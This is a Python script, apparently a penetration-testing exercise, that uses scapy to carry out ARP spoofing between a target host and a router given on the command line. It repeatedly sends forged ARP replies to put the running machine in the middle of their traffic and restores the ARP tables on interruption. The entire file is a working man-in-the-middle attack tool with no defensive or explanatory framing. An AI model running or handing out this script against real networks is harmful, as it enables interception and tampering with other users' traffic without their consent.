import optparse,time
import scapy.all as scapy

def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-t","--target",dest="target_ip",help="Target ip")
    parser.add_option("-r","--router",dest="router_ip",help="Router ip")
    
    options , arguments = parser.parse_args()

    if not options.target_ip or not options.router_ip:
        parser.error("[log] -h for help")
    return options

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    arp_broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = arp_broadcast/arp_request
    answered =scapy.srp(arp_request_broadcast,timeout=1,verbose=False)[0]
    return answered[0][1].hwsrc

def spoof(target_ip,spoof_ip):
    target_mac = get_mac(target_ip)
    #spoof_mac = get_mac(spoof_ip)
    arp_respone = scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=spoof_ip)
    scapy.send(arp_respone,verbose=False)


def restore(destinion_ip, source_ip):
    destinion_mac = get_mac(destinion_ip)
    source_mac = get_mac(source_ip)
    arp_respone = scapy.ARP(op=2,pdst=destinion_ip,hwdst=destinion_mac,psrc=source_ip,hwsrc=source_mac)
    scapy.send(arp_respone,verbose=False,count=4)

options = get_arguments()
spoof_ip = options.router_ip
target_ip = options.target_ip

try:
    while True:
        time.sleep(2)
        spoof(target_ip,spoof_ip)
        spoof(spoof_ip,target_ip)
        print('[log] 2 send packets \n')
except:
    restore(target_ip,spoof_ip)
    restore(spoof_ip,target_ip)
    print('[log] Existing..')